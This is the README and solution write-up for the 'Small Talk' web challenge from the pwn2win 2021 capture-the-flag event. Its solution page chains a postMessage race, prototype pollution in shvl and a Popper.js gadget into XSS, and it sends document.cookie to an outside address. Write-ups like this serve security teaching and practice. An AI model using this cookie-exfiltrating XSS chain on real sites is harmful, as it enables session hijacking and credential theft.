# Small Talk - pwn2win 2021
**Description:** Take a little break in your journey, read some of our extravagant knowledgement to become your best version...

...and, of course, share your sentences with us.

**Solves:** 16

**First Blood:** More Smoked Leet Chicken

# Running it
`docker-compose build`

`docker-compose up -d`

environment will be running at http://localhost:1337

## Advisory
In order to get the flag through cookies you must run it with HTTPS to set cookies with samesite none parameter.

## Solution

To solve this challenge submit to the bot your page with the following code:

```
<!--
Pwn2win 2021 Small Talk solution
step 1: race condition in postMessage
step 2: prototype pollution in shvl
step 3: use Popper.js as gadget to achieve xss
-->

<iframe name="page" style="height: 500px" src="https://small-talk.coach:1337/#send-button"></iframe>

<body><input id="oi" autofocus></body>
<script>
    setInterval(function(){
        window.frames["page"].postMessage('{"__proto__.reference.onblur": "location=`https://your.address.com/${document.cookie}`", "message": "gonna hack"}', '*');
    }, 0);
</script>
<script>
    setInterval(function(){
        oi = document.querySelector('#oi');
        oi.focus();
    }, 700)
</script>
```